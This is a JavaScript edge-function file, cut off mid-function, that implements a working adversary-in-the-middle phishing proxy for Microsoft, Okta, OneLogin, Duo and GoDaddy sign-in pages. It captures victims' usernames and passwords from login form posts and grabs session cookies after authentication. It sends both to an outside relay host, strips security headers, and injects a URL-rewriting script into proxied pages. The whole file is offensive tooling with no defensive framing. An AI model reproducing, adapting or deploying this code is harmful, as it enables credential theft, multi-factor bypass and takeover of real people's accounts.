export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'ayola-ozamu.zeabur.app';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' },
  'csp.secureserver.net': { type: 'godaddy', name: 'GoDaddy CSP' },
  'api.godaddy.com': { type: 'godaddy', name: 'GoDaddy API' },
  'www.godaddy.com': { type: 'godaddy', name: 'GoDaddy WWW' },
  'img1.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images' },
  'img2.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 2' },
  'img3.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 3' },
  'img4.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 4' },
  'img5.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 5' },
  'img6.wsimg.com': { type: 'godaddy', name: 'GoDaddy Images 6' }
};

const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'akm_lmprb', 'auth_id', 'auth_token', 'ssotoken', 'JSESSIONID']
};

const POST_LOGIN_PATTERNS = {
  microsoft: [
    '/common/oauth2/authorize',
    '/common/oauth2/v2.0/authorize',
    '/common/login',
    '/common/SAS/ProcessAuth',
    '/common/federation/oauth2',
    '/kmsi',
    '/common/DeviceAuthTls',
    '/common/login/user'
  ],
  okta: [
    '/oauth2/v1/authorize',
    '/oauth2/default/v1/authorize',
    '/login/sessionCookieRedirect',
    '/auth/services/devicefingerprint',
    '/api/v1/authn',
    '/sso/idps'
  ],
  onelogin: [
    '/access/idp',
    '/access/oidc',
    '/trust/openid-connect/v2',
    '/session'
  ],
  duo: [
    '/frame/prompt',
    '/frame/web/v1/auth',
    '/auth/v2/auth'
  ],
  godaddy: [
    '/authenticate',
    '/login/authenticate',
    '/v1/sso/authenticate',
    '/account/session'
  ]
};

const UPSTREAM_CONTEXT = {
  currentDomain: null,
  currentPath: null
};

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    const cleanUrl = url.split('?')[0];
    const content = 'IP: ' + ip + '\nPlatform: ' + platform + '\nURL: ' + cleanUrl + '\nData: Cookies found:\n\n' + cookieText + '\n';
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-' + platform + '-COOKIE.txt');
    formData.append("ip", ip);
    formData.append("type", "cookie-file");

    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];

    UPSTREAM_CONTEXT.currentDomain = upstreamDomain;
    UPSTREAM_CONTEXT.currentPath = upstreamPath;

    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }

  UPSTREAM_CONTEXT.currentDomain = INITIAL_UPSTREAM;
  UPSTREAM_CONTEXT.currentPath = pathname;

  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';

  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');

  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }

  if (pathValues.length === 1) {
    const val = pathValues[0];
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }

  return search;
}

function shouldProxyDomain(hostname) {
  if (!hostname) return false;
  if (IDENTITY_PROVIDERS[hostname]) return true;
  if (hostname.includes('microsoft') || hostname.includes('live.com') || 
      hostname.includes('office.com') || hostname.includes('msauth.net')) return true;
  if (hostname.includes('godaddy.com') || hostname.includes('secureserver.net')) return true;
  if (hostname.includes('okta.com')) return true;
  if (hostname.includes('onelogin.com')) return true;
  if (hostname.includes('duosecurity.com')) return true;
  if (hostname.includes('wsimg.com')) return true;
  return false;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    if (shouldProxyDomain(url.hostname)) {
      return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + url.hostname + url.pathname + url.search;
    }
    return location;
  } catch (e) {
    return location;
  }
}

function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => {
    if (p === '.*') return true;
    return cookieString.toLowerCase().includes(p.toLowerCase());
  });
}

function isPostLoginEndpoint(path, platform) {
  const patterns = POST_LOGIN_PATTERNS[platform] || [];
  return patterns.some(pattern => path.toLowerCase().includes(pattern.toLowerCase()));
}

function isSuccessfulAuthRedirect(status, location, platform) {
  if (![301, 302, 303, 307, 308].includes(status)) return false;
  if (!location) return false;

  const lowerLoc = location.toLowerCase();

  if (platform === 'microsoft') {
    return lowerLoc.includes('code=') || 
           lowerLoc.includes('access_token=') || 
           lowerLoc.includes('id_token=') ||
           (!lowerLoc.includes('login.microsoftonline.com') && 
            !lowerLoc.includes('login.live.com') &&
            !lowerLoc.includes('reprocess'));
  }

  if (platform === 'okta') {
    return lowerLoc.includes('sessionToken') || 
           lowerLoc.includes('fromURI') ||
           (!lowerLoc.includes('okta.com/login') && 
            !lowerLoc.includes('okta.com/auth'));
  }

  if (platform === 'godaddy') {
    return lowerLoc.includes('account') || 
           lowerLoc.includes('dashboard') ||
           lowerLoc.includes('products') ||
           (!lowerLoc.includes('login') && 
            !lowerLoc.includes('authenticate'));
  }

  return !shouldProxyDomain(new URL(location).hostname);
}

function parseCredentials(bodyText) {
  let user = null;
  let pass = null;

  if (!bodyText) return { user, pass };

  try {
    const jsonData = JSON.parse(bodyText);
    if (jsonData.username || jsonData.email || jsonData.user || jsonData.login) {
      user = jsonData.username || jsonData.email || jsonData.user || jsonData.login;
    }
    if (jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass) {
      pass = jsonData.password || jsonData.passwd || jsonData.pwd || jsonData.pass;
    }
    if (user && pass) return { user, pass };
  } catch (e) {}

  const keyValuePairs = bodyText.split('&');
  for (const pair of keyValuePairs) {
    const [key, value] = pair.split('=');
    if (!value) continue;

    const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));

    if (key === 'login' || key === 'loginfmt' || key === 'username' || key === 'email' || key === 'user') {
      user = decodedValue;
    }
    if (key === 'passwd' || key === 'password' || key === 'pwd' || key === 'pass') {
      pass = decodedValue;
    }
  }

  return { user, pass };
}

function generateInterceptorScript(upstreamDomain, currentPath) {
  const pathWithoutQuery = currentPath.split('?')[0];
  const pathSegments = pathWithoutQuery.split('/').filter(Boolean);
  const baseSegment = pathSegments.length > 0 ? pathSegments[0] : '';
  const basePath = baseSegment ? '/' + baseSegment + '/' : '/';

  return "\n<script>\n(function() {\n  'use strict';\n\n  try {\n    const PROXY_PREFIX = '" + PROXY_PREFIX + "';\n    const YOUR_DOMAIN = '" + YOUR_DOMAIN + "';\n    const CURRENT_UPSTREAM = '" + upstreamDomain + "';\n    const CURRENT_BASE_PATH = '" + basePath + "';\n\n    console.log('[Proxy Interceptor] Initializing for upstream:', CURRENT_UPSTREAM, 'Base path:', CURRENT_BASE_PATH);\n\n    function shouldProxyDomain(hostname) {\n      if (!hostname) return false;\n      const domains = [\n        'microsoftonline.com', 'live.com', 'microsoft.com', 'msauth.net',\n        'office.com', 'microsoft365.com', 'outlook.office.com', 'outlook.live.com',\n        'godaddy.com', 'secureserver.net', 'csp.secureserver.net', \n        'sso.godaddy.com', 'sso.secureserver.net', 'api.godaddy.com',\n        'okta.com', 'onelogin.com', 'duosecurity.com',\n        'wsimg.com', 'img1.wsimg.com', 'img2.wsimg.com', 'img3.wsimg.com',\n        'img4.wsimg.com', 'img5.wsimg.com', 'img6.wsimg.com',\n        'gui.godaddy.com', 'www.godaddy.com'\n      ];\n      return domains.some(d => hostname.includes(d));\n    }\n\n    function rewriteUrl(url) {\n      if (!url || typeof url !== 'string') return url;\n      try {\n        if (url.includes(YOUR_DOMAIN + PROXY_PREFIX)) return url;\n        if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('javascript:')) return url;\n        if (url.startsWith('#')) return url;\n\n        if (url.startsWith('http://') || url.startsWith('https://')) {\n          try {\n            const urlObj = new URL(url);\n            if (shouldProxyDomain(urlObj.hostname)) {\n              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + urlObj.hash;\n            }\n          } catch(e) {}\n          return url;\n        }\n\n        if (url.startsWith('//')) {\n          const hostname = url.split('/')[2];\n          if (shouldProxyDomain(hostname)) {\n            return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + hostname + url.substring(2 + hostname.length);\n          }\n          return 'https:' + url;\n        }\n\n        if (url.startsWith('/')) {\n          const cleanPath = url.substring(1);\n          if (cleanPath.startsWith('_p/')) return url;\n          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + '/' + cleanPath;\n        }\n\n        if (!url.startsWith('/') && !url.startsWith('http')) {\n          const currentDir = CURRENT_BASE_PATH;\n          return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + CURRENT_UPSTREAM + currentDir + url;\n        }\n\n      } catch(e) {\n        console.error('[Proxy Interceptor] Error rewriting URL:', url, e);\n      }\n      return url;\n    }\n\n    const originalImageSrc = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'src');\n    Object.defineProperty(HTMLImageElement.prototype, 'src', {\n      get: function() {\n        return originalImageSrc.get.call(this);\n      },\n      set: function(value) {\n        const newSrc = rewriteUrl(value);\n        if (newSrc !== value) {\n          console.log('[Proxy Interceptor] Rewrote Image.src:', value, '->', newSrc);\n        }\n        originalImageSrc.set.call(this, newSrc);\n      }\n    });\n\n    if ('srcset' in HTMLImageElement.prototype) {\n      const originalSrcset = Object.getOwnPropertyDescriptor(HTMLImageElement.prototype, 'srcset') \n        || { get: function() { return this.getAttribute('srcset'); }, set: function(v) { this.setAttribute('srcset', v); }};\n\n      Object.defineProperty(HTMLImageElement.prototype, 'srcset', {\n        get: function() { return originalSrcset.get.call(this); },\n        set: function(value) {\n          if (!value) {\n            originalSrcset.set.call(this, value);\n            return;\n          }\n          const urls = value.split(',').map(part => {\n            const trimmed = part.trim();\n            const spaceIdx = trimmed.search(/\\s/);\n            let url, descriptor;\n            if (spaceIdx === -1) {\n              url = trimmed;\n              descriptor = '';\n            } else {\n              url = trimmed.slice(0, spaceIdx);\n              descriptor = trimmed.slice(spaceIdx);\n            }\n            const newUrl = rewriteUrl(url);\n            return newUrl + descriptor;\n          });\n          const newValue = urls.join(', ');\n          if (newValue !== value) {\n            console.log('[Proxy Interceptor] Rewrote srcset:', value, '->', newValue);\n          }\n          originalSrcset.set.call(this, newValue);\n        }\n      });\n    }\n\n    const originalFetch = window.fetch;\n    window.fetch = function(url, options) {\n      try {\n        let rewrittenUrl = url;\n        if (typeof url === 'string') {\n          rewrittenUrl = rewriteUrl(url);\n          if (rewrittenUrl !== url) {\n            console.log('[Proxy Interceptor] Rewrote fetch:', url, '->', rewrittenUrl);\n          }\n        } else if (url instanceof Request) {\n          const newUrl = rewriteUrl(url.url);\n          if (newUrl !== url.url) {\n            rewrittenUrl = new Request(newUrl, url);\n            console.log('[Proxy Interceptor] Rewrote Request:', url.url, '->', newUrl);\n          }\n        }\n        return originalFetch.call(this, rewrittenUrl, options);\n      } catch(e) {\n        return originalFetch.call(this, url, options);\n      }\n    };\n\n    const originalOpen = XMLHttpRequest.prototype.open;\n    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {\n      try {\n        const rewrittenUrl = rewriteUrl(url);\n        if (rewrittenUrl !== url) {\n          console.log('[Proxy Interceptor] Rewrote XHR:', url, '->', rewrittenUrl);\n        }\n        return originalOpen.call(this, method, rewrittenUrl, async, user, password);\n      } catch(e) {\n        return originalOpen.call(this, method, url, async, user, password);\n      }\n    };\n\n    if (window.WebSocket) {\n      const originalWebSocket = window.WebSocket;\n      window.WebSocket = function(url, protocols) {\n        try {\n          const rewrittenUrl = rewriteUrl(url);\n          if (rewrittenUrl !== url) {\n            console.log('[Proxy Interceptor] Rewrote WebSocket:', url, '->', rewrittenUrl);\n          }\n          return new originalWebSocket(rewrittenUrl, protocols);\n        } catch(e) {\n          return new originalWebSocket(url, protocols);\n        }\n      };\n    }\n\n    if ('serviceWorker' in navigator) {\n      const fakeRegistration = {\n        active: null,\n        installing: null,\n        waiting: null,\n        scope: '/',\n        update: function() { return Promise.resolve(this); },\n        unregister: function() { return Promise.resolve(true); }\n      };\n\n      navigator.serviceWorker.register = function(scriptURL, options) {\n        console.log('[Proxy Interceptor] Blocking service worker:', scriptURL);\n        return Promise.resolve(fakeRegistration);\n      };\n    }\n\n    if (typeof MutationObserver !== 'undefined') {\n      const observer = new MutationObserver(function(mutations) {\n        mutations.forEach(function(mutation) {\n          if (mutation.type === 'attributes' && mutation.attributeName === 'style') {\n            const node = mutation.target;\n            if (node.style && node.style.backgroundImage) {\n              const current = node.style.backgroundImage;\n              const newBg = current.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n                if (url.startsWith('http') || url.startsWith('/')) {\n                  const newUrl = rewriteUrl(url);\n                  if (newUrl !== url) return 'url(' + newUrl + ')';\n                }\n                return match;\n              });\n              if (newBg !== current) {\n                node.style.backgroundImage = newBg;\n                console.log('[Proxy Interceptor] Rewrote backgroundImage:', current, '->', newBg);\n              }\n            }\n          }\n\n          mutation.addedNodes.forEach(function(node) {\n            if (node.nodeType === 1) {\n              try {\n                if (node.src && !node.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {\n                  const newSrc = rewriteUrl(node.src);\n                  if (newSrc !== node.src) {\n                    node.src = newSrc;\n                    console.log('[Proxy Interceptor] Rewrote node src:', newSrc);\n                  }\n                }\n\n                if (node.href && !node.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !node.href.startsWith('#')) {\n                  const newHref = rewriteUrl(node.href);\n                  if (newHref !== node.href) {\n                    node.href = newHref;\n                    console.log('[Proxy Interceptor] Rewrote node href:', newHref);\n                  }\n                }\n\n                if (node.style && node.style.cssText) {\n                  const newCss = node.style.cssText.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n                    const newUrl = rewriteUrl(url);\n                    if (newUrl !== url) return 'url(' + newUrl + ')';\n                    return match;\n                  });\n                  if (newCss !== node.style.cssText) {\n                    node.style.cssText = newCss;\n                  }\n                }\n\n                if (node.querySelectorAll) {\n                  node.querySelectorAll('[src],[href],[style]').forEach(function(el) {\n                    if (el.src && !el.src.includes(YOUR_DOMAIN + PROXY_PREFIX)) {\n                      const newSrc = rewriteUrl(el.src);\n                      if (newSrc !== el.src) el.src = newSrc;\n                    }\n                    if (el.href && !el.href.includes(YOUR_DOMAIN + PROXY_PREFIX) && !el.href.startsWith('#')) {\n                      const newHref = rewriteUrl(el.href);\n                      if (newHref !== el.href) el.href = newHref;\n                    }\n                    if (el.style && el.style.cssText) {\n                      el.style.cssText = el.style.cssText.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n                        const newUrl = rewriteUrl(url);\n                        return newUrl !== url ? 'url(' + newUrl + ')' : match;\n                      });\n                    }\n                  });\n                }\n              } catch(e) {}\n            }\n          });\n        });\n      });\n\n      if (document.body) {\n        observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });\n      } else {\n        document.addEventListener('DOMContentLoaded', function() {\n          if (document.body) observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'src', 'href'] });\n        });\n      }\n    }\n\n    const originalSetProperty = CSSStyleDeclaration.prototype.setProperty;\n    CSSStyleDeclaration.prototype.setProperty = function(property, value, priority) {\n      if (property && property.toLowerCase().includes('background') && value && value.includes('url(')) {\n        value = value.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n          const newUrl = rewriteUrl(url);\n          if (newUrl !== url) return 'url(' + newUrl + ')';\n          return match;\n        });\n      }\n      return originalSetProperty.call(this, property, value, priority);\n    };\n\n    if (CSSStyleSheet && CSSStyleSheet.prototype.insertRule) {\n      const originalInsertRule = CSSStyleSheet.prototype.insertRule;\n      CSSStyleSheet.prototype.insertRule = function(rule, index) {\n        const newRule = rule.replace(/url\\([\"']?([^\"')]+)[\"']?\\)/g, (match, url) => {\n          const newUrl = rewriteUrl(url);\n          return newUrl !== url ? 'url(' + newUrl + ')' : match;\n        });\n        return originalInsertRule.call(this, newRule, index);\n      };\n    }\n\n    document.addEventListener('submit', function(e) {\n      const form = e.target;\n      if (form.action && !form.action.includes(YOUR_DOMAIN + PROXY_PREFIX)) {\n        try {\n          const actionUrl = new URL(form.action);\n          if (shouldProxyDomain(actionUrl.hostname)) {\n            const newAction = rewriteUrl(form.action);\n            form.action = newAction;\n            console.log('[Proxy Interceptor] Rewrote form action to:', newAction);\n          }\n        } catch(err) {}\n      }\n    }, true);\n\n    console.log('[Proxy Interceptor] Successfully initialized for upstream:', CURRENT_UPSTREAM);\n  } catch(err) {\n    console.error('[Proxy Interceptor] Failed to initialize:', err);\n  }\n})();\n</script>";
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';

  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }

  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = 'https://' + upstreamDomain + upstreamPath;
  const displayUrl = 'https://' + YOUR_DOMAIN + url.pathname;

  console.log('[' + info.type + '] ' + request.method + ' ' + displayUrl + ' -> ' + upstreamUrl);

  if (request.method === 'OPTIONS') {
    return new Response(null, {
      status: 200,
      headers: {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, PATCH, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type, Authorization, X-Requested-With, X-Requested-By',
        'Access-Control-Allow-Credentials': 'true',
        'Access-Control-Max-Age': '86400'
      }
    });
  }

  const headers = new Headers();

  const originalUA = request.headers.get('user-agent');
  const originalAccept = request.headers.get('accept');
  const originalAcceptLang = request.headers.get('accept-language');
  const originalAcceptEnc = request.headers.get('accept-encoding');
  const originalCookie = request.headers.get('cookie');
  const originalContentType = request.headers.get('content-type');

  headers.set('User-Agent', originalUA || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
  headers.set('Accept', originalAccept || 'application/json, text/plain, */*');
  headers.set('Accept-Language', originalAcceptLang || 'en-US,en;q=0.9');
  headers.set('Accept-Encoding', originalAcceptEnc || 'gzip, deflate, br');
  headers.set('Host', upstreamDomain);
  headers.set('Referer', 'https://' + upstreamDomain + '/');
  headers.set('Origin', 'https://' + upstreamDomain);

  if (originalContentType) {
    headers.set('Content-Type', originalContentType);
  }

  if (originalCookie) {
    headers.set('Cookie', originalCookie);
  }

  const xrw = request.headers.get('x-requested-with');
  if (xrw) headers.set('X-Requested-With', xrw);

  headers.delete('expect');
  headers.delete('connection');
  headers.delete('keep-alive');
  headers.delete('proxy-connection');
  headers.delete('transfer-encoding');
  headers.delete('x-forwarded-host');
  headers.delete('x-forwarded-proto');
  headers.delete('x-forwarded-for');
  headers.delete('content-length');

  let bodyText = null;
  let requestBodyForUpstream = null;

  if (request.method === 'POST' || request.method === 'PUT' || request.method === 'PATCH') {
    try {
      const clonedRequest = request.clone();
      bodyText = await clonedRequest.text();

      console.log('[DEBUG] POST body:', bodyText.substring(0, 500));

      const { user, pass } = parseCredentials(bodyText);

      if (user && pass) {
        console.log('[CREDENTIALS CAPTURED] User: ' + user.substring(0, 5) + '... Platform: ' + info.type);

        await sendToVercel('credentials', {
          type: "creds",
          ip: ip,
          user: user,
          pass: pass,
          platform: info.type,
          url: displayUrl
        });

        const content = 'IP: ' + ip + '\nPlatform: ' + info.type + '\nUser: ' + user + '\nPass: ' + pass + '\nURL: ' + displayUrl + '\n';
        const formData = new FormData();
        formData.append("file", new Blob([content], { type: "text/plain" }), ip + '-CREDENTIALS.txt');
        formData.append("ip", ip);
        formData.append("type", "credentials");

        await fetch(VERCEL_URL, {
          method: "POST",
          body: formData,
        });
      }

      requestBodyForUpstream = bodyText;

    } catch (error) {
      console.error('Credential capture error:', error);
      requestBodyForUpstream = request.body;
    }
  }

  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };

    if (!['GET', 'HEAD'].includes(request.method)) {
      if (requestBodyForUpstream !== null) {
        const encoder = new TextEncoder();
        const bodyBytes = encoder.encode(requestBodyForUpstream);
        headers.set('content-length', bodyBytes.length.toString());
        fetchOpts.body = bodyBytes;
      } else {
        fetchOpts.body = request.body;
      }
    }

    console.log('[DEBUG] Fetching upstream: ' + upstreamUrl);
    console.log('[DEBUG] Method: ' + request.method);
    console.log('[DEBUG] Has body: ' + !!fetchOpts.body);
    console.log('[DEBUG] Content-Type: ' + headers.get('content-type'));
    console.log('[DEBUG] Content-Length: ' + headers.get('content-length'));

    const resp = await fetch(upstreamUrl, fetchOpts);

    console.log('[DEBUG] Upstream response status: ' + resp.status);

    const location = resp.headers.get('Location');
    const isAuthSuccess = isSuccessfulAuthRedirect(resp.status, location, info.type);

    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      if (location) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(location);

        console.log('[Redirect] ' + location + ' -> ' + newLoc);

        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }

    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.set('access-control-allow-methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
    newHeaders.set('access-control-allow-headers', 'Content-Type, Authorization, X-Requested-With');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    newHeaders.delete('strict-transport-security');

    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);

    let shouldCaptureCookies = false;
    let cookieStr = '';

    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      const hasAuthCookies = hasCriticalAuthCookies(cookieStr, info.type);
      const isPostLogin = request.method === 'POST' && isPostLoginEndpoint(info.path, info.type);

      shouldCaptureCookies = isPostLogin || (isAuthSuccess && hasAuthCookies);

      if (shouldCaptureCookies) {
        console.log('[COOKIE CAPTURE] Post-login: ' + isPostLogin + ', AuthSuccess: ' + isAuthSuccess + ', HasAuthCookies: ' + hasAuthCookies);
      }

      cookies.forEach(c => {
        if (!c) return;
        let mod = c.replace(/Domain=[^;]+;?/gi, '');
        mod = mod.replace(/Secure;?/gi, '');
        mod = mod.replace(/SameSite=[^;]+;?/gi, '');

        if (mod.includes('Path=')) {
          mod = mod.replace(/Path=([^;]+)/i, (match, path) => {
            return 'Path=' + PROXY_PREFIX + upstreamDomain + path;
          });
        } else {
          mod += '; Path=' + PROXY_PREFIX + upstreamDomain + '/';
        }

        mod += '; SameSite=None; Secure';
        newHeaders.append('Set-Cookie', mod);
      });
    }

    if (shouldCaptureCookies && cookieStr) {
      await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
    }

    const ct = resp.headers.get('content-type') || '';

    if (/text\/html|application\/javascript|application\/json|text\/javascript|text\/css/.test(ct)) {
      let text = await resp.text();

      if (ct.includes('text/html')) {
        const interceptor = generateInterceptorScript(upstreamDomain, info.path);

        if (text.includes('<head>')) {
          text = text.replace('<head>', '<head>' + interceptor);
        } else if (text.includes('<html>')) {
          text = text.replace('<html>', '<html>' + interceptor);
        } else {
          text = interceptor + text;
        }
      }

      Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
        const escaped = domain.replace(/\./g, '\\.');
        const regex = new RegExp('https?://' + escaped + '([^"\'`\\s)]*)', 'gi');
        text = text.replace(regex, 'https://' + YOUR_DOMAIN + PROXY_PREFIX + domain + '$1');
      });

      if (ct.includes('text/html')) {
        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, (match, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:')) return match;
          return 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/' + path + ')';
        });

        text = text.replace(/srcset=["']([^"']+)["']/gi, (match, srcset) => {
          const urls = srcset.split(',').map(part => {
            const [url, descriptor] = part.trim().split(/\s+/);
            if (url && url.startsWith('/') && !url.startsWith('/_p/')) {
              return 'https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + url + (descriptor ? ' ' + descriptor : '');
            }
            return part;
          });
          return 'srcset="' + urls.join(', ') + '"';
        });
      }

      if (ct.includes('text/html')) {
        text = text.replace(/(src|href)="\/([^"]+)"/gi, (match, attr, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
            return match;
          }
          return attr + '="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/' + path + '"';
        });

        text = text.replace(/(src|href)='\/([^']+)'/gi, (match, attr, path) => {
          if (path.startsWith('_p/') || path.startsWith('data:') || path.startsWith('blob:')) {
            return match;
          }
          return attr + '="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/' + path + '"';
        });

        text = text.replace(/src="\/_next\/static\/([^"]+)"/gi, 
          'src="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/_next/static/$1"');
        text = text.replace(/href="\/_next\/static\/([^"]+)"/gi, 
          'href="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/_next/static/$1"');
        text = text.replace(/src='\/_next\/static\/([^']+)'/gi, 
          "src='https://" + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + "/_next/static/$1'");
        text = text.replace(/href='\/_next\/static\/([^']+)'/gi, 
          "href='https://" + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + "/_next/static/$1'");

        const currentDir = info.path.replace(/\/[^\/]*$/, '/');
        text = text.replace(/(src|href)="([^"]+)"/gi, (match, attr, path) => {
          if (path.startsWith('/') || path.startsWith('http') || path.startsWith('data:') || path.startsWith('blob:') || path.startsWith('#')) {
            return match;
          }
          return attr + '="https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + currentDir + path + '"';
        });
      }

      text = text.replace(/url\(["']?(https?:\/\/[^"')]+)["']?\)/gi, (match, url) => {
        try {
          const urlObj = new URL(url);
          if (shouldProxyDomain(urlObj.hostname)) {
            return 'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + urlObj.hostname + urlObj.pathname + urlObj.search + ')';
          }
        } catch(e) {}
        return match;
      });

      if (ct.includes('text/css')) {
        text = text.replace(/url\(["']?\/([^"')]+)["']?\)/gi, 
          'url(https://' + YOUR_DOMAIN + PROXY_PREFIX + upstreamDomain + '/$1)');

        const cssCurrentDir = info.path.replace(/\/[^\/]*$/, '/');
        text = text.replace(/url\(["']?([^\/"')][^"')]*)["']?\)/gi, (match, path) => {
